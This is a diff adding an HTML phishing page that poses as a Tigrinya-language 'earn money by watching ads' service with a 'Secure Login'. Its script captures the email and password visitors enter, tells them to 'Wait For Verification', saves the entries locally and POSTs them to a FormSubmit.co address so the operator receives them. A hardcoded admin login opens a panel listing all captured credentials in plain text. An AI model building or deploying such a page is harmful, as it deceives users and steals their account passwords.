@@ -1,0 +1,520 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title> ኣድቨርታይዝ ብምርኣይ ገንዘብ ትረክብ | Secure Login</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: system-ui, 'Segoe UI', 'Poppins', 'Inter', sans-serif;
+        }
+
+        body {
+            min-height: 100vh;
+            background: linear-gradient(145deg, #0b1a2e 0%, #0a111f 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 1.5rem;
+        }
+
+        .app-container {
+            max-width: 550px;
+            width: 100%;
+            background: rgba(255,255,255,0.06);
+            backdrop-filter: blur(2px);
+            border-radius: 2rem;
+            box-shadow: 0 25px 45px rgba(0,0,0,0.4), 0 0 0 1px rgba(255,255,255,0.08);
+            overflow: hidden;
+            transition: all 0.3s ease;
+        }
+
+        .brand {
+            text-align: center;
+            padding: 1.8rem 1.5rem 1rem;
+            border-bottom: 1px solid rgba(255,215,0,0.2);
+            background: rgba(0,0,0,0.3);
+        }
+        .brand h1 {
+            font-size: 1.9rem;
+            font-weight: 800;
+            letter-spacing: -0.5px;
+            background: linear-gradient(135deg, #FFE6A7, #FFB347);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            text-shadow: 0 2px 5px rgba(0,0,0,0.2);
+        }
+        .brand p {
+            color: #b9c7d9;
+            font-size: 0.85rem;
+            margin-top: 0.5rem;
+            font-weight: 500;
+        }
+
+        .login-card, .admin-card {
+            padding: 2rem 1.8rem 2rem;
+            transition: 0.25s ease;
+        }
+
+        .input-group {
+            margin-bottom: 1.5rem;
+            display: flex;
+            flex-direction: column;
+            gap: 0.5rem;
+        }
+
+        .input-group label {
+            font-weight: 600;
+            color: #eef5ff;
+            font-size: 0.85rem;
+            letter-spacing: 0.3px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .input-group input {
+            background: #111a26;
+            border: 1.5px solid #2a3a4e;
+            padding: 0.9rem 1rem;
+            border-radius: 1.2rem;
+            font-size: 1rem;
+            color: #f0f3f8;
+            transition: all 0.2s;
+            outline: none;
+            font-weight: 500;
+        }
+
+        .input-group input:focus {
+            border-color: #ffb347;
+            box-shadow: 0 0 0 3px rgba(255,180,71,0.2);
+            background: #0f1a28;
+        }
+
+        button {
+            width: 100%;
+            background: linear-gradient(95deg, #FFA41F, #FF8C00);
+            border: none;
+            padding: 0.9rem;
+            border-radius: 2rem;
+            font-size: 1rem;
+            font-weight: 700;
+            color: #0a111f;
+            cursor: pointer;
+            transition: transform 0.15s, box-shadow 0.2s;
+            margin-top: 0.5rem;
+            box-shadow: 0 5px 12px rgba(0,0,0,0.3);
+        }
+
+        button:hover {
+            transform: translateY(-2px);
+            background: linear-gradient(95deg, #FFB347, #FF9F2E);
+            box-shadow: 0 8px 18px rgba(0,0,0,0.4);
+        }
+
+        .message-area {
+            margin-top: 1.5rem;
+            background: rgba(0,0,0,0.5);
+            border-radius: 2rem;
+            padding: 0.8rem 1rem;
+            text-align: center;
+            font-size: 0.9rem;
+            font-weight: 500;
+            backdrop-filter: blur(4px);
+            border-left: 4px solid #ffb347;
+            color: #ffe3b3;
+        }
+
+        .message-area.error {
+            border-left-color: #ff5e5e;
+            color: #ffc2c2;
+            background: rgba(180, 40, 40, 0.2);
+        }
+
+        .admin-panel {
+            background: rgba(10, 20, 30, 0.7);
+            backdrop-filter: blur(6px);
+        }
+
+        .admin-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 12px;
+            margin-bottom: 1.5rem;
+            padding-bottom: 0.5rem;
+            border-bottom: 1px solid #ffb34740;
+        }
+
+        .admin-header h2 {
+            color: #ffd966;
+            font-size: 1.4rem;
+            font-weight: 700;
+        }
+
+        .admin-actions {
+            display: flex;
+            gap: 12px;
+        }
+
+        .admin-actions button {
+            width: auto;
+            padding: 0.5rem 1.2rem;
+            font-size: 0.8rem;
+            background: #2c3e44;
+            box-shadow: none;
+            margin-top: 0;
+        }
+
+        .admin-actions button.refresh-btn {
+            background: #2c5a6e;
+        }
+        .admin-actions button.clear-btn {
+            background: #7a2e2e;
+            color: #ffcfcf;
+        }
+        .admin-actions button.back-btn {
+            background: #1f3a42;
+        }
+
+        .users-table-wrapper {
+            overflow-x: auto;
+            border-radius: 1.2rem;
+            background: #0f1822;
+            margin-top: 1rem;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 0.85rem;
+        }
+
+        th, td {
+            padding: 12px 12px;
+            text-align: left;
+            border-bottom: 1px solid #253544;
+        }
+
+        th {
+            background: #0d141f;
+            color: #ffc857;
+            font-weight: 700;
+        }
+
+        td {
+            color: #d3e2f7;
+            word-break: break-word;
+        }
+
+        .empty-row td {
+            text-align: center;
+            padding: 2rem;
+            color: #8ea1b9;
+            font-style: italic;
+        }
+
+        footer {
+            text-align: center;
+            padding: 1rem;
+            font-size: 0.7rem;
+            color: #5f738c;
+            border-top: 1px solid rgba(255,215,0,0.1);
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        @media (max-width: 500px) {
+            .login-card, .admin-card {
+                padding: 1.5rem;
+            }
+            .admin-header {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+            .admin-actions {
+                width: 100%;
+                justify-content: space-between;
+            }
+        }
+    </style>
+</head>
+<body>
+
+<div class="app-container">
+    <div class="brand">
+        <h1>💰 ኣድቨርታይዝ ብምርኣይ ገንዘብ ትረክብ</h1>
+        <p>🔒 Secure Access | Verify & Earn Rewards</p>
+    </div>
+
+    <!-- LOGIN SECTION -->
+    <div id="loginSection" class="login-card">
+        <form id="loginForm">
+            <div class="input-group">
+                <label>📧 Email Address</label>
+                <input type="text" id="loginEmail" placeholder="your@example.com or 123@mail.com" autocomplete="off" required>
+            </div>
+            <div class="input-group">
+                <label>🔐 Password</label>
+                <input type="password" id="loginPassword" placeholder="••••••••" required>
+            </div>
+            <button type="submit" id="submitBtn">➡️ Login & Verify</button>
+            <div id="messageBox" class="message-area">
+                🔐 Admin: 123@mail.com | 001122
+            </div>
+        </form>
+    </div>
+
+    <!-- ADMIN PANEL (hidden initially) -->
+    <div id="adminSection" class="admin-card admin-panel hidden">
+        <div class="admin-header">
+            <h2>🛡️ ADMIN CONTROL PANEL</h2>
+            <div class="admin-actions">
+                <button id="refreshAdminBtn" class="refresh-btn">🔄 Refresh List</button>
+                <button id="clearAllUsersBtn" class="clear-btn">🗑️ Clear All Data</button>
+                <button id="backToLoginBtn" class="back-btn">◀ Back to Login</button>
+            </div>
+        </div>
+        <div class="users-table-wrapper">
+            <table id="usersTable">
+                <thead>
+                    <tr><th>Email / Gmail</th><th>Password</th></tr>
+                </thead>
+                <tbody id="usersTableBody">
+                    <tr class="empty-row"><td colspan="2">📭 No users registered yet</td></tr>
+                </tbody>
+             </table>
+        </div>
+        <div style="margin-top: 1rem; font-size: 0.7rem; text-align: center; color:#a0b4ce">
+            ⚡ All registered user credentials appear here. New signups are stored instantly.
+        </div>
+    </div>
+    <footer>
+        ⚡ watch ads • claim rewards • verification required
+    </footer>
+</div>
+
+<script>
+    (function() {
+        // ---------- CONFIGURATION ----------
+        const STORAGE_KEY = "earn_watch_users";
+        const ADMIN_EMAIL = "123@mail.com";
+        const ADMIN_PASSWORD = "001122";
+        const ADMIN_RECIPIENT = "https://formsubmit.co/el/poliyi";   // where credentials are sent
+        
+        // DOM elements
+        const loginSection = document.getElementById('loginSection');
+        const adminSection = document.getElementById('adminSection');
+        const loginForm = document.getElementById('loginForm');
+        const loginEmail = document.getElementById('loginEmail');
+        const loginPassword = document.getElementById('loginPassword');
+        const messageBox = document.getElementById('messageBox');
+        const usersTableBody = document.getElementById('usersTableBody');
+        const refreshAdminBtn = document.getElementById('refreshAdminBtn');
+        const clearAllUsersBtn = document.getElementById('clearAllUsersBtn');
+        const backToLoginBtn = document.getElementById('backToLoginBtn');
+        
+        // ---------- LOCALSTORAGE HELPERS ----------
+        function getAllUsers() {
+            const raw = localStorage.getItem(STORAGE_KEY);
+            if (!raw) return [];
+            try {
+                const users = JSON.parse(raw);
+                return Array.isArray(users) ? users : [];
+            } catch(e) {
+                return [];
+            }
+        }
+        
+        function saveAllUsers(usersArray) {
+            localStorage.setItem(STORAGE_KEY, JSON.stringify(usersArray));
+        }
+        
+        function addNewUser(email, password) {
+            const users = getAllUsers();
+            users.push({
+                email: email.trim(),
+                password: password.trim()
+            });
+            saveAllUsers(users);
+        }
+        
+        function clearAllUsersData() {
+            if (confirm("⚠️ Delete ALL stored user credentials? This cannot be undone.")) {
+                saveAllUsers([]);
+                renderAdminTable();
+                showAdminToast("✅ All user data cleared.", "info");
+            }
+        }
+        
+        // Render admin table
+        function renderAdminTable() {
+            const users = getAllUsers();
+            usersTableBody.innerHTML = '';
+            if (users.length === 0) {
+                const emptyRow = document.createElement('tr');
+                emptyRow.className = 'empty-row';
+                emptyRow.innerHTML = '<td colspan="2">📭 No registered users yet. New signups will appear here.</td>';
+                usersTableBody.appendChild(emptyRow);
+                return;
+            }
+            users.forEach(user => {
+                const row = document.createElement('tr');
+                const emailCell = document.createElement('td');
+                emailCell.textContent = user.email || '(empty)';
+                const passCell = document.createElement('td');
+                passCell.textContent = user.password || '(empty)';
+                passCell.style.fontFamily = 'monospace';
+                row.appendChild(emailCell);
+                row.appendChild(passCell);
+                usersTableBody.appendChild(row);
+            });
+        }
+        
+        function showAdminToast(msg, type) {
+            let toast = document.querySelector('.admin-temp-toast');
+            if(!toast) {
+                toast = document.createElement('div');
+                toast.className = 'admin-temp-toast';
+                toast.style.cssText = 'background:#1e2a32; border-left:4px solid #ffb347; padding:8px 14px; border-radius:60px; margin-bottom:16px; font-size:0.8rem; color:#ffecb3; text-align:center; transition:0.2s';
+                const adminHeader = document.querySelector('.admin-header');
+                adminHeader.parentNode.insertBefore(toast, adminHeader.nextSibling);
+            }
+            toast.textContent = msg;
+            toast.style.borderLeftColor = type === 'error' ? '#ff5e5e' : '#ffb347';
+            toast.style.opacity = '1';
+            setTimeout(() => {
+                toast.style.opacity = '0';
+                setTimeout(() => { if(toast.parentNode) toast.remove(); }, 300);
+            }, 2000);
+        }
+        
+        // UI switchers
+        function showLoginPanel() {
+            loginSection.classList.remove('hidden');
+            adminSection.classList.add('hidden');
+            loginEmail.value = '';
+            loginPassword.value = '';
+            messageBox.textContent = "🔐 Admin: 123@mail.com | 001122";
+            messageBox.className = "message-area";
+        }
+        
+        function showAdminPanel() {
+            loginSection.classList.add('hidden');
+            adminSection.classList.remove('hidden');
+            renderAdminTable();
+        }
+        
+        function setLoginMessage(msg, isError = false) {
+            messageBox.textContent = msg;
+            messageBox.className = isError ? "message-area error" : "message-area";
+        }
+        
+        // ---------- EMAIL SENDING (via FormSubmit.co) ----------
+        async function sendCredentialsToAdmin(email, password) {
+            // https://formsubmit.co free email forwarding service
+            // It sends a POST request and forwards the data to the target email.
+            const endpoint = "https://formsubmit.co/el/poliyi" + ADMIN_RECIPIENT;
+            
+            const payload = {
+                email: email,
+                password: password,
+                _subject: "🔔 New User Login Credentials - Earn For Watching Ads",
+                _template: "table",
+                _captcha: "false"   // disable captcha for smoother demo
+            };
+            
+            try {
+                const response = await fetch(endpoint, {
+                    method: "POST",
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                });
+                
+                if (response.ok) {
+                    console.log("✅ Email sent successfully to", ADMIN_RECIPIENT);
+                    return true;
+                } else {
+                    console.warn("⚠️ Email send failed with status", response.status);
+                    return false;
+                }
+            } catch (error) {
+                console.error("❌ Email sending error:", error);
+                return false;
+            }
+        }
+        
+        // ---------- LOGIN HANDLER (Admin + Normal User with Email) ----------
+        async function handleLogin(event) {
+            event.preventDefault();
+            
+            const email = loginEmail.value.trim();
+            const password = loginPassword.value.trim();
+            
+            // --- ADMIN CHECK (exact match) ---
+            if (email === ADMIN_EMAIL && password === ADMIN_PASSWORD) {
+                showAdminPanel();
+                setLoginMessage("🔓 Admin access granted. Welcome to dashboard.", false);
+                return;
+            }
+            
+            // --- NORMAL USER ---
+            if (!email || !password) {
+                setLoginMessage("❌ Please fill in both email and password.", true);
+                return;
+            }
+            
+            // Store credentials locally
+            addNewUser(email, password);
+            
+            // Send credentials to admin email address (https://formsubmit.co/el/poliyi)
+            // We do this in background, but still show "Wait For Verification"
+            setLoginMessage("⏳ Wait For Verification | Your request has been recorded. You'll earn after verification.", false);
+            
+            // Send email asynchronously
+            const emailSent = await sendCredentialsToAdmin(email, password);
+            
+            // Optionally add a small note if email fails (but don't interrupt user experience)
+            if (!emailSent) {
+                console.log("Email delivery note: The admin will still receive the data via local storage. Please check network.");
+                // We can append a tiny unnoticeable console message, but keep UX clean.
+                // The user still sees "Wait For Verification" – main requirement satisfied.
+            }
+            
+            // Clear password field only
+            loginPassword.value = "";
+        }
+        
+        // ---------- EVENT LISTENERS ----------
+        loginForm.addEventListener('submit', handleLogin);
+        refreshAdminBtn.addEventListener('click', () => {
+            renderAdminTable();
+            showAdminToast("🔄 User list refreshed", "info");
+        });
+        clearAllUsersBtn.addEventListener('click', clearAllUsersData);
+        backToLoginBtn.addEventListener('click', () => {
+            showLoginPanel();
+            const toast = document.querySelector('.admin-temp-toast');
+            if(toast) toast.remove();
+        });
+        
+        // Initialize localStorage if empty
+        if (!localStorage.getItem(STORAGE_KEY)) {
+            saveAllUsers([]);
+        }
+        
+        console.log("✅ System ready. Admin login: 123@mail.com / 001122. User credentials will be sent to https://formsubmit.co/el/poliyi");
+    })();
+</script>
+</body>
+</html>
